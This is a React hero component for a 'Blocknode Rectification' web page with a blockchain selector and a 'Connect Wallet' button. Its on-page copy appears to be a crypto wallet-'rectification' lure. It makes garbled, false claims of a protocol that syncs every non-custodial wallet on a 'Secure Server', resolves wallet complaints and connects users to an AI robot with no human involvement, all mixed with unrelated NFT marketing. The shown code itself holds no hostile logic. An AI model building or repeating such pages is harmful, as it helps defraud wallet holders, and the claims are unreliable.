import React, { useState } from 'react'
import BlocknodeRectification from "../assets/BlocknodeRectification.png"
import { RiArrowDownSLine, RiArrowUpSLine } from "react-icons/ri";
import { Link } from 'react-router-dom'
import { wallets } from '../utils/wallets';

const chains = ['Select Chain', 'Ethereum', 'Binance', 'Polygon', 'Avalanche', 'Fantom', 'Arbitrum', 'Cranos']

const Hero = () => {
  const [dropDown,setDropDown] = useState(false)
  const [chain,setChain] = useState('Select Chain')

  const handleChain = () => {

  }

  const handleDropDown = (e) => {
    if(!e.target.classList.contains("chain")){
      setDropDown(false)
    }
  }

  return (
      <div className='container mx-auto p-8 mt-10 min-h-[100vh]' onClick={handleDropDown}>
        <div className='sm:w-full md:w-[70%] mx-auto mb-10'>
          <img src={BlocknodeRectification} alt="hero.png" className='w-full' />
        </div>
      <div className='w-95 mx-auto my-5 text-white text-center p-2'>
        <p className='mb-8'>Every digital artwork on Upside is authentic and truly unique.</p>

        <p className='mb-8'>Blockchain technology makes this new approach to digital ownership possible.<br/>
        Open and decentralized protocol for syncing various Wallets issues on Secure Server.</p>

        <p className='mb-8'>This is not an app but a protocol that establishes a remote resolution<br/>
        between all noncustodial wallet It is an online server which gets you across to every wallet <br/>representative to enable effective complain and rectification of issues.</p>

        <p className='mb-8'>You will be on a chat with an Artificial Intelligence Robot with zero Human interference.</p>
      </div>
      <div className='flex flex-col md:flex-row gap-y-3 justify-between md:w-[50%] mx-auto'>
        <button className='py-3 px-4 lg:px-8 md:w-[48%] bg-[rgba(0,201,32,1)] rounded-full font-bold text-center'>Connect Wallet</button>
        <div className='md:w-[48%] relative'>
          <button className='pl-5 pr-1 py-1 w-full chain lg:gap-x-4 bg-transparent rounded-full font-bold inline-flex justify-between text-[rgba(0,201,32,1)] ring-1 ring-inset ring-[rgba(0,201,32,1)] items-center' onClick={()=>setDropDown(!dropDown)} >{chain} {dropDown?<RiArrowUpSLine className='text-4xl bg-[rgba(0,201,32,1)] text-white rounded-full'/>:<RiArrowDownSLine className='text-4xl chain bg-[rgba(0,201,32,1)] text-white rounded-full'/>}</button>
          {dropDown && <div className='bg-[#0F0F0F] border border-[rgba(48,48,48,0.9)] rounded-xl h-56 overflow-hidden overflow-y-auto absolute top-14 left-0 right-0 scrollbar scrollbar-thin scrollbar-thumb-[rgba(0,201,32,1)] z-30'>
              {chains.map((item,index)=>{
              return (
                <div className='px-6 py-3' key={index}>
                  <h5 className='text-white font-semibold cursor-pointer hover:text-[rgba(0,201,32,1)]' onClick={()=>setChain(item)}>{item}</h5>
              </div>
              )
              })}
          </div>}
        </div>
      </div>
      </div>
  )
}

export default Hero
